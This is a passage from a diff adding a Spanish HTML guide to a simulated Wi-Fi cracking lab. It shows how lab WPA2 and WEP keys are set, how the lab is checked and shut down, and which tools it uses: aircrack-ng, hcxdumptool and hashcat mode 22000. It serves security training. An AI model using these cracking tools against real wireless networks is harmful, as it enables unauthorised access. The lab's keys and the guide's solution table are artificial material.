+<pre class="hljs"><code><div>./calculaPMK.py he_wpa2 &lt;nueva_clave&gt;
+</div></code></pre>
+<p>Usa palabras de <code>rockyou.txt</code> de 8 a 63 caracteres.</p>
+</li>
+<li>
+<p><strong>WEP:</strong> <code>wep_key0</code> en hex. Solo admite 5 o 13 caracteres ASCII (10 o 26 hex):</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">printf</span> <span class="hljs-string">'ilovemyfamily'</span> | od -An -tx1 | tr -d <span class="hljs-string">' \n'</span>
+</div></code></pre>
+</li>
+</ul>
+<p>Tras cambiar una clave, actualiza la tabla de soluciones de esta guía.</p>
+<hr>
+<h2 id="verificacion-y-apagado">Verificación y apagado</h2>
+<pre class="hljs"><code><div><span class="hljs-comment"># Ver APs y namespaces activos</span>
+ip netns list
+sudo ip netns <span class="hljs-built_in">exec</span> ns_ap_pmkid_nc iw dev
+
+<span class="hljs-comment"># Apagar todo el laboratorio</span>
+sudo ./limpia.sh
+</div></code></pre>
+<hr>
+<h2 id="herramientas-usadas">Herramientas usadas</h2>
+<ul>
+<li><strong>aircrack-ng suite</strong> (<code>airmon-ng</code>, <code>airodump-ng</code>, <code>aireplay-ng</code>, <code>aircrack-ng</code>)</li>
+<li><strong>hcxdumptool / hcxpcapngtool / hcxhashtool</strong> (captura, conversión y
+filtrado de PMKID/handshake)</li>
+<li><strong>hashcat</strong> (modo <code>22000</code> = WPA-PBKDF2-PMKID+EAPOL), en CPU mediante PoCL</li>
+<li><strong>tshark</strong> (análisis de capturas)</li>
+</ul>
+
+</div>
